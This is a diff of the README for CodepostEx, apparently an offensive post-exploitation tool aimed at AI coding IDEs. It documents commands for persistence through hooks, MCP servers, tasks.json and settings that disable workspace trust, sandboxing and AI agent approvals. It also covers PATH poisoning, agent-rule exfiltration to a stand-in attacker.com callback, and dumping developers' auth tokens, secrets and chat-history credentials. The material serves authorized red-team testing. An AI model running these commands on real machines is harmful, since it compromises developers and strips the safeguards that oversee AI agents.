@@ -1,4 +1,5 @@
 # Introduction
+CodepostEx is an open-source offensive security tool designed to target trusted AI IDE environments without requiring administrative privileges, enabling covert post-exploitation tactics and techniques. It supports multiple AI IDEs, including Cursor, Windsurf, Kiro, Trae, Antigravity and so on.
 
 ```
   ___         _                  _   ___     
@@ -9,9 +10,6 @@
 
          Living of The IDE (Post-Exploiatiion) 
 ```
-
-CodepostEx is an open-source offensive security tool designed to target trusted AI IDE environments without requiring administrative privileges, enabling covert post-exploitation tactics and techniques. It supports multiple AI IDEs, including Cursor, Windsurf, Kiro, Trae, Antigravity and so on.
-
 > **Authorized use only.** This tool must only be used during penetration tests or red team engagements with explicit written permission from the system owner. Unauthorized use is illegal and may violate computer fraud laws in your jurisdiction.
 
 ## Requirements
@@ -115,7 +113,7 @@ Injects a `hooks.json` payload into Cursor's hooks directory. Hooks execute arbi
 | `all-users` | `C:\ProgramData\Cursor\hooks.json` | No |
 | `all` | All of the above | No |
 
-**Supported hook events (21):** `sessionStart`, `sessionEnd`, `beforeSubmitPrompt`, `afterSubmitPrompt`, `workspaceOpen`, `workspaceClose`, `fileOpen`, `fileClose`, `fileSave`, `terminalOpen`, `terminalClose`, `terminalCommand`, `toolCall`, `toolResult`, `agentStart`, `agentEnd`, `codeApply`, `codeReject`, `diffAccept`, `diffReject`, `backgroundAgentRun`
+**Supported hook events (21):** `sessionStart`, `sessionEnd`, `beforeSubmitPrompt`, `workspaceOpen`, `preToolUse`, `postToolUse`, `postToolUseFailure`, `beforeShellExecution`, `afterShellExecution`, `beforeMCPExecution`, `afterMCPExecution`, `beforeReadFile`, `afterFileEdit`, `subagentStart`, `subagentStop`, `preCompact`, `stop`, `afterAgentResponse`, `afterAgentThought`, `beforeTabFileRead`, `afterTabFileEdit`
 
 #### MCP Server Injection
 
@@ -134,7 +132,7 @@ Injects a malicious Model Context Protocol server definition into the IDE's `mcp
 
 #### Insecure Settings Injection 
 
-Injects persistence directly into `settings.json`. Three methods available; all merge into the existing file. The `insecure` method covers the broadest attack surface — 61 dangerous settings that disable security controls across the IDE.
+Injects persistence directly into `settings.json`. Three methods available; all merge into the existing file. The `insecure` method covers the broadest attack surface 61 dangerous settings that disable security controls across the IDE.
 
 Supports: Cursor, Windsurf, Kiro, Trae, Antigravity.
 
@@ -147,19 +145,7 @@ Supports: Cursor, Windsurf, Kiro, Trae, Antigravity.
 | `-w, -workspace` | Required for `workspace` scope |
 | `-f, -force` | Overwrite existing keys |
 
-
-**Methods:**
-
-| Method | Key written | Trigger | Effect |
-|--------|------------|---------|--------|
-| `path-poison` | `terminal.integrated.env.windows` | Every integrated terminal open | Prepends attacker directory to `PATH`; any binary in that dir shadows system tools |
-| `shell-args` | `terminal.integrated.shellArgs.windows` | Every integrated terminal open | Executes attacker command before spawning the shell |
-| `insecure` | 61 keys (bulk) | Persistent - applied on every IDE start | Disables workspace trust, auto-task confirmation, sandbox, telemetry, extension validation, security prompts, certificate checks, and more |
-
-The `insecure` method explicitly excludes `hooks` and `mcpServers` those have dedicated modules above.
-
-**Insecure** method key categories (61 keys):** `workspace trust disabled`, `auto-task execution`, `terminal commands without confirmation`, `extension updates/validation disabled`, `git operations without confirmation`, `telemetry disabled`, `file access restrictions disabled`, `chat/agent sandbox disabled`, `notifications disabled`, `insecure network connections`, `uri handler restrictions disabled`, `cursor privacy disabled`, `ai agent approvals disabled`, `language validator allows malicious paths`, `search includes sensitive directories`, `editor auto-actions`.
-
+The `insecure` method explicitly excludes `hooks` and `mcpServers` those have dedicated modules above. **Insecure** method key categories (61 keys): `workspace trust disabled`, `auto-task execution`, `terminal commands without confirmation`, `extension updates/validation disabled`, `git operations without confirmation`, `telemetry disabled`, `file access restrictions disabled`, `chat/agent sandbox disabled`, `notifications disabled`, `insecure network connections`, `uri handler restrictions disabled`, `cursor privacy disabled`, `ai agent approvals disabled`, `language validator allows malicious paths`, `search includes sensitive directories`, `editor auto-actions`.
 
 #### Agent Rules Injection (Mallskill)
 
@@ -184,75 +170,102 @@ Injects malicious agent rules into Trae's project rules file (`.trae\rules\proje
 | `-examples` | Usage examples |
 | `-version` | Show version |
 
----
-
 ## Examples
+
+Discover installed AI IDEs and read account or device info
 ```
-# Discover installed AI IDEs
-CodepostEx -discover
+C:\> CodepostEx -discover -cu -ide cursor
+```
+List trusted workspaces with metadata
 
-# Read account / device info for all IDEs
-CodepostEx -current-user
+```
+C:\> CodepostEx -workspace-trust-list -include-metadata -ide antigravity
+[+] Antigravity - 18 trusted workspace(s)
+[^] C:\Users\Offsec\.gemini\antigravity\playground\final-voyager
+[^] D:\Codepost
+```
 
-# List trusted workspaces with metadata
-CodepostEx -workspace-trust-list -include-metadata -ide All
+Extracts agent conversation history and collects artifacts that c
 
-# Extract AI chats + HTML report
-CodepostEx -ide Cursor -extract-ai-chats -html -output C:\loot
+```
+CodepostEx -ide Cursor -extract-ai-chats -artifacts -html -output C:\Loot
+C:\> [*] Collecting Cursor artifacts...
+[+] Cursor: 29197 entries extracted.
+[*] Mapped to 58 workspace(s).
+[+] Artifact files loaded: 258
+[+] HTML: C:\Loot\Reports\Cursor_Report.html
+```
 
-# Extract AI chats filtered by date
-CodepostEx -extract-ai-chats -chats-since 2026-01-01
+The following are the generates a report that organizes collected credentials, sensitive information, conversations, and artifacts by workspace, providing operators with a centralized view for analyzing data collected.
 
-# Collect IDE history and settings into ZIP
-CodepostEx -ide Cursor -artifacts
+| Dashboard |
+|-----------|
+|![Index](https://github.com/user-attachments/assets/fb5e0294-739a-4652-99c0-655b846f88f9)|
 
-# Search chats for credentials and emails
-CodepostEx -search Credentials,Emails
+Chat, artifact, and credential counts by AI IDE, workspace file counts, and credential breakdowns by category including **supported patterns**: Cloud (`AWS Access Key`, `AWS API Key`, `AWS S3 Bucket`, `Google API Key`, `GCP OAuth`, `Google OAuth Token`, `GCP Service Account`, `Firebase`, `Azure Storage Key`, `Heroku API Key`), Database (`MongoDB`, `PostgreSQL`, `MySQL`, `Redis`, `Cassandra connection strings`), Dev Key (`GitHub Token`, `GitHub Access Token`, `OpenAI API Key`, `OpenAI Project Key`, `Anthropic API Key`), SaaS (`Slack Token`, `Slack Webhook`, `Stripe Key`, `Twilio Key`, `MailChimp Key`, `Mailgun Key`, `PayPal Token`, `Square Token`), Social (`Discord Token`, `Facebook Token`, `Twitter Token`), Crypto (`PGP Private Key`, `RSA Private Key`, `EC Private Key`, `OpenSSH Key`, `DSA Private Key`), PII (`Email addresses`), Network (`IPv4 addresses`), Generic (`JWT Token`, `Basic Auth URL`, `Auth Bearer`, `Generic API Key`, `Generic Secret`).
 
-# Collect file-edit history and scan for sensitive originals
-CodepostEx -ide Cursor -history -history-interesting
+| Credentials | Artifacts | Chats |
+|-------------|-----------|-------|
+| ![Creds](https://github.com/user-attachments/assets/25b34d3b-af5c-447b-8c78-26a48fa0fa7a) | ![Art](https://github.com/user-attachments/assets/c9e919e4-5f0b-4bca-95fc-42f4369f9f82) | ![Chats](https://github.com/user-attachments/assets/2ca57f97-722a-424d-bdb6-f4aba3b3520f) |
 
-# Dump and decode auth tokens
-CodepostEx -ide All -dump-token -decode-token -validate-token
 
-# Decrypt extension secrets including git tokens
-CodepostEx -dump-secrets -include-git-secrets
+Search chats for credentials and emails with support for predefined categories and free-text search terms.
+ 
+```
+C:\> CodepostEx -search Credentials,Emails
+[*] Scanning Cursor history: C:\Users\IDE\User\History
+[+] [Email] Email: redacted@email.io
+[^] File: redacted.py
 
-# Inject tasks payload into a trusted workspace
-CodepostEx -payload-injected tasks.json -workspace C:\project -force
+C:\> CodepostEx -search "github.com" -ide Cursor
 
-# Inject Cursor hooks at user scope
-CodepostEx -inject-hooks -hooks-command "powershell -enc <b64>"
+```
 
-# Inject Cursor hooks at project scope (two events, two commands)
-CodepostEx -inject-hooks -hooks-scope project -hooks-event beforeSubmitPrompt,fileSave -hooks-command "powershell -enc <b64>,powershell -enc <b64>" -workspace C:\project
+Collect or dump and decode auth tokens
 
-# Inject MCP server into trusted workspace (project scope)
-CodepostEx -inject-mcp -mcp-scope project -mcp-name dev-proxy -mcp-command "powershell -enc <b64>" -workspace C:\project
+```
+C:\Tools>CodepostEx -ide Cursor -dump-token -decode-token -validate-token
+[*] Extracting tokens from Cursor...
+[+] AccessToken
+[^] Source: cursorAuth/accessToken
+[^] Value: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnb29nbGUtb2F1dGgyfH.redacted
+[^] Subject: google-oauth2|user_redacted
+[^] Issuer: https://authentication.cursor.sh
+[^] Expires: 24/10/2026 14:02:07 +07:00
+[^] Expired: False
+[^] Status: Valid
+[^] Online: AcceptedOnline
 
-# Inject MCP server into all IDEs (user scope)
-CodepostEx -inject-mcp -mcp-ide All -mcp-name dev-tools -mcp-command "powershell -enc <b64>"
+[+] RefreshToken
+[^] Source: cursorAuth/refreshToken
+[^] Value: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnb29nbGUtb2F1dGgy.redacted
+[^] Subject: google-oauth2|user_.redacted
+[^] Issuer: https://authentication.cursor.sh
+[^] Expires: 24/10/2026 14:02:07 +07:00
+[^] Expired: False
+[^] Status: Valid
+[^] Online: AcceptedOnline
+````
 
-# Inject insecure settings into trusted workspace (61 keys)
-CodepostEx -inject-settings -settings-method insecure -settings-scope workspace -workspace C:\project
+Inject Cursor hooks (Hook persistence) at user or all-user scope with multiple events (two events, two commands) 
 
-# PATH-poisoning at user scope
-CodepostEx -inject-settings -settings-payload C:\loot
+```
+CodepostEx -inject-hooks -hooks-scope all-users -hooks-event beforeSubmitPrompt,afterFileEdit -hooks-command "calc.exe,notepad.exe"
+```
 
-# Inject Trae agent exfiltration rules
+The following video demonstrates one of the persistence techniques
+
+[![Watch the demo](https://img.youtube.com/vi/nPeJuF9HPv0/maxresdefault.jpg)](https://youtu.be/nPeJuF9HPv0)
+
+
+Creating malskills and inject Trae agent exfiltration rules
+
+```
 CodepostEx -malskill-exfiltration -callback-url https://attacker.com/collect -workspace C:\project
+```
 
-# Force-overwrite existing Trae rules
-CodepostEx -malskill-exfiltration -callback-url https://attacker.com/collect -workspace C:\project -force
+The following commands demonstrate the full persistence chain within a trusted workspace (not recommended).
 
-# Full persistence chain on a trusted workspace
+```
 CodepostEx -payload-injected tasks.json -inject-mcp -mcp-scope project -inject-settings -settings-method insecure -settings-scope workspace -inject-hooks -hooks-scope project -hooks-command "powershell -enc <b64>" -workspace C:\project -force
 ```
-
-## Demonstrations
-
-HTML Report Sample:
-
-| Dashboard	| Reports	|
-| ------------  | ------------ |
-|![Index](https://user-images.githubusercontent.com/17976841/63597336-6ab6e880-c5e7-11e9-819e-91634e347b0c.PNG)|![f](https://user-images.githubusercontent.com/17976841/63597476-bbc6dc80-c5e7-11e9-8985-6a73348a2e02.PNG)|
